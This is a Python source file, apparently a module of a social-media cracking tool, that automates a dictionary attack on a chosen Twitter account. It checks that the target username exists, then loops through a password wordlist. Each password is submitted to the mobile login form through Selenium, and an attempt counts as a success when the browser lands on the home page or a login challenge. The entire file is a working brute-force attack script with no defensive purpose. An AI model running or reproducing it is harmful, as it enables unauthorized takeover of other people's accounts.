import time


class Twitter:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        # 'https://mobile.twitter.com/login'
        self.url = 'https://mobile.twitter.com/session/new'

    def check_user(self):
        self.browser.driver.get('https://twitter.com/%s' % self.username)
        if self.username in self.browser.driver.title:
            name = self.browser.driver.find_element_by_xpath(
                '//div[@class="fullname"]')
            #name = self.browser.driver.find_element_by_xpath('//a[@href="/%s"]' % self.username)
            self.name = name.text
            return True
        else:
            return False

    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            email = self.browser.wait_until_element_exists('name', 'session[username_or_email]')
            #email = self.browser.driver.find_element_by_name(
            #    'session[username_or_email]')
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_name('session[password]')
            pwd.send_keys(password)

            form = self.browser.driver.find_elements_by_xpath('.//form')[0]
            form.submit()

            self.browser.wait_page_loaded()

            url = self.browser.driver.current_url
            if url == "https://mobile.twitter.com/" or url == "https://mobile.twitter.com/home" or 'https://mobile.twitter.com/account/login_challenge' in url:
                found = password
                break
            time.sleep(self.delay)

        return found
